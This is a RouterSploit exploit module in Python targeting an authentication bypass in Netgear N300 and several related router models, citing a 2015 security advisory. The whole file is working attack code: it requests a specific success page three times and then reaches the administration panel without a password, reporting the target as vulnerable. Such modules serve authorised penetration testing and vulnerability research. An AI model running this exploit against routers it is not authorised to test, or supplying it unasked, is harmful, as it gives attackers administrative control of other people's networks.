from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netgear N300 Auth Bypass",
        "description": "Module exploits authentication bypass vulnerability in Netgear N300 devices. "
                       "It is possible to access administration panel without providing password.",
        "authors": (
            "Daniel Haake <daniel.haake[at]csnc.de>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2015-007_Netgear_WNR1000v4_AuthBypass.txt",
            "http://www.shellshocklabs.com/2015/09/part-1en-hacking-netgear-jwnr2010v5.html",
        ),
        "devices": (
            "Netgear N300",
            "Netgear JNR1010v2",
            "Netgear JNR3000",
            "Netgear JWNR2000v5",
            "Netgear JWNR2010v5",
            "Netgear R3250",
            "Netgear WNR2020",
            "Netgear WNR614",
            "Netgear WNR618",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}".format(self.target, self.port)
            print_info("Visit: {}/\n".format(url))
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/",
        )
        if response is None:
            return False  # target is not vulnerable

        # unauthorized
        if response.status_code == 401:
            for _ in range(0, 3):
                response = self.http_request(
                    method="GET",
                    path="/BRS_netgear_success.html",
                )
                if response is None:
                    return False  # target is not vulnerable

            response = self.http_request(
                method="GET",
                path="/"
            )
            if response is None:
                return False  # target is not vulnerable

            # authorized
            if response.status_code == 200:
                return True  # target is vulnerable

        return False  # target not vulnerable
